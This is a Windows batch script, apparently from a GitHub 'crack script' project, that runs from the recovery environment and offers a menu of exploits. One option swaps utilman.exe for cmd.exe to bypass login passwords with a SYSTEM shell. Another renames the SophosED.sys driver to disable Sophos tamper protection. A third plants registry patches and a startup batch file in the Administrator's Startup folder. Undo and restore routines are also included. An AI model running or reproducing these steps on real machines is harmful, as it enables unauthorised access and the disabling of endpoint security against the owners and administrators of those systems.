@echo off
setlocal enabledelayedexpansion

rem Crack Script Made by S1rDyn0
rem Contributors: Viren070

if /i "%CD:~0,2%" NEQ "X:" (
  color 0C
  echo                __
  echo               / _^)
  echo      _.----._/ /
  echo     /         /
  echo  __/ ^(  ^| ^(  ^|
  echo /__.-^'^|_^|--^|_^|
  echo EXPLOIT ERROR... & echo:
  echo You must be in the Installer/Recovery environment to run this script^!
  pause
  cls
  color 07
  exit 
) else (
  cls
  color 3F
  echo: & echo Proceed with caution, we do not take any responsibility for damage caused by this script.
  echo Credit to S1rDyno for the orginal script ^& Viren070 for contributing to improve it.
  echo: & echo https://github.com/S1rDyn0/BootUSB-Crack-Script ^| OpenSource & echo: & echo: & echo:
  pause
)
:menu
color 07
cls
echo ^|==================================^|
echo ^|  WINDOWS 10  EXPLOIT BY S1rDyn0  ^|
echo ^|   ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~    ^| 
echo ^|                                  ^|
echo ^|  BUILD ^| Production     23.5.9   ^|
echo ^|==================================^| & echo: & echo:

echo +++++ Password Exploit
echo ^[1^] Local Password Exploit
echo ^[2^] Undo Password Exploit
echo ^[3^] Restore Original Files

echo: & echo +++++ Sophos Exploit
echo ^[4^] Disable Sophos Tamper Protection
echo ^[5^] Sophos Registry Exploit

echo: & echo +++++ Other
echo ^[6^] Show On-Screen Keyboard
echo: & echo +++++ Exit
echo ^[0^] Exit
echo: & echo: & echo:

set validOptions=0 1 2 3 4 5 6
set "crackType="
set /p "crackType=^>"

set optionFound=false
for %%a in (!validOptions!) do (
  if "!crackType!"=="%%a" (
    set optionFound=true
  )
)

if not !optionFound!==true (
  color 0C
  cls
  call :showDinoError
  echo Looks like that^'s an invalid option^!
  timeout /t 5 
  goto menu
)
if "!crackType!" EQU "0" (
  color 07
  cls & echo Exiting...
  exit 
)

if "!crackType!" EQU "1" (
  call :local-password-exploit
)

if "!crackType!" EQU "2" (
  call :undo-password-exploit
)

if "!crackType!" EQU "3" (
  call :restore-original-files
)

if "!crackType!" EQU "4" (
  call :disable-sophos-tamper-protection
)
if "!crackType!" EQU "5" (
  call :sophos-registry-exploit
)

if "!crackType!" EQU "6" (
  echo Running OSK.exe...
  start "" "C:\windows\system32\osk.exe" || goto :cmdFail
  color 0A
  cls
  echo Started OSK.exe 
  echo Returning to menu...
  timeout /t 5
  
  goto :menu
)

goto :menu


:local-password-exploit
cls
echo Starting Hack
echo.
if exist "c:\windows\system32" (
  echo System Directory Found	
  echo Renaming utilman.exe to utilman.old
  echo.
  ren C:\windows\system32\utilman.exe utilman.old || goto :cmdFail
  echo.
  echo Copying cmd.exe to utilman.exe
  echo.
  copy C:\windows\system32\cmd.exe C:\windows\system32\utilman.exe || goto :cmdFail

  echo -----------------------------------
  color 0A
  echo Exploit Completed ^| No errors
  pause
  goto menu

) else (
  color 0C
  call :showDinoError
  echo Could not find System Directory... & echo:
  echo Failing Exploit and returning to menu
  timeout /t 5 
  goto menu
)


rem Option 4 is for the Sophos registry hack. This will use xcopy to make a new folder at C:\SophosUtility
rem It will next copy the sophos folder inside that directory.
rem Then it will copy evoke.bat to C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup as shortcut creation requires vbs script and not good choice in recovery environment
rem this will run autorun.bat script located in C:\SophosUtility\Sophos\autorub.bat
:disable-sophos-tamper-protection
cls
echo Starting Hack
if exist "c:\windows\system32\drivers" (
  echo System Directory Found
    

  echo Renaming SophosED.sys to SophosED.sys.old
  ren C:\windows\system32\drivers\SophosED.sys SophosED.sys.old || goto :cmdFail
  
  color 0A
  echo -----------------------------------
  echo Exploit Completed ^| No errors
  pause
  goto menu


) else (
  color 0C
  call :showDinoError
  echo Could not find System Directory... & echo:
  echo Failing Exploit and returning to menu
  timeout /t 5 
  goto menu
) 

:sophos-registry-exploit
cls
echo Preparing Patch...

set "startupFolder=C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
set "sophosFolder=X:\sources\sophos"
set "registryPatch1=!sophosFolder!\1EndpointDefense.reg"
set "registryPatch2=!sophosFolder!\2SophosMCSAgent.reg"
set "autorunScript=!sophosFolder!\autorun.bat"

if not exist "!startupFolder!" (
  echo Could not find Startup folder...
  echo Failing Registry Patch
  goto :cmdFail
)

if not exist "!sophosFolder!" (
  echo Could not find Sophos folder...
  echo Failing Registry Patch
  goto :cmdFail
)

if not exist "!registryPatch1!" (
  echo Could not find Registry File number 1...
  echo Failing Registry Patch
  goto :cmdFail
)

if not exist "!registryPatch2!" (
  echo Could not find Registry File number 2...
  echo Failing Registry Patch
  goto :cmdFail
)

if not exist "!autorunScript!" (
  echo Could not find the Autorun Script...
  echo Failing Registry Patch
  goto :cmdFail
)

echo Patch files located^!
echo Starting Patch...

if not exist C:\SophosUtility (
  mkdir C:\SophosUtility || goto :cmdFail
)
copy "%sophosFolder%" C:\SophosUtility || goto :cmdFail
copy "C:\SophosUtility\sophos\evoke.bat" "%startupFolder%" || goto :cmdFail

echo -----------------------------------
echo Sophos Registry Patch Completed ^| No errors
echo Returning to Menu
timeout /t 5
goto menu 

:undo-password-exploit
cls
echo Preparing restore...
if exist "c:\windows\system32" (
  echo Located System folder
) else (
  color 0C
  call :showDinoError
  echo Could not find System Folder... & echo: & echo Failing Exploit and returning to menu
  timeout /t 5 
  goto menu
)
if exist "c:\windows\system32\utilman.old" (
  echo Original utilman.exe file found
) else (
  color 0C
  call :showDinoError
  echo Could not find utilman.old... & echo: & echo Failing Exploit and returning to menu
  timeout /t 5 
  goto menu
)
if not exist "c:\windows\system32\cmd.exe" (
  echo You seem to be missing the original cmd.exe file, try option 3 to restore it
)
if exist "c:\windows\system32\utilman.exe" (
  echo Exploited utilman.exe file found
) else (
  color 0C
  call :showDinoError
  echo Could not find exploited utilman... & echo: & echo Failing Exploit and returning to menu
  timeout /t 5 
  goto menu
)

echo All system files located^! & echo: & echo Starting undo...
echo Renaming utilman.old to utilman.exe....
copy /y C:\windows\system32\utilman.old C:\windows\system32\utilman.exe || goto :cmdFail


color 0A
echo -----------------------------------
echo Restore Completed ^| No errors
pause
goto menu

:restore-original-files
cls
echo Preparing restore...
set "cmdBackup=X:\sources\restore\cmd.exe"
set "utilmanBackup=X:\sources\restore\utilman.exe"
if exist "x:\sources\restore" (
  echo Located restore folder
) else (
  color 0C
  call :showDinoError
  echo Could not find Restore Folder, place the original files in a folder called restore... & echo: & echo Failing Exploit and returning to menu
  timeout /t 5 
  goto menu
)
if exist !cmdBackup! (
  echo Command Prompt backup found
) else (
  color 0C
  call :showDinoError
  echo Could not find Command Prompt backup, you can find the original file in the GitHub repository... & echo: & echo Failing Exploit and returning to menu
  timeout /t 5 
  goto menu
)
if exist !utilmanBackup! (
  echo Utilman backup found
) else (
  color 0C
  call :showDinoError
  echo Could not find Utilman backup,  you can find the original file in the GitHub repository... & echo: & echo Failing Exploit and returning to menu
  timeout /t 5 
  goto menu
)

echo Backup files located^! & echo: & echo Starting restore...
copy /y !utilmanBackup! C:\windows\system32 || goto :cmdFail
copy /y !cmdBackup! C:\windows\system32 || goto :cmdFail

color 0A
echo -----------------------------------
echo Restore Completed ^| No errors
pause
goto menu

:cmdFail
echo ------------------------------------------------
call :showDinoError
echo An error occurred during command execution.
echo Failing Exploit and returning to menu
pause
goto menu

:showDinoError
color 0C
echo                __
echo               / _^)
echo      _.----._/ /
echo     /         /
echo  __/ ^(  ^| ^(  ^|
echo /__.-^'^|_^|--^|_^|
echo Exploit ID !crackType! failed & echo:
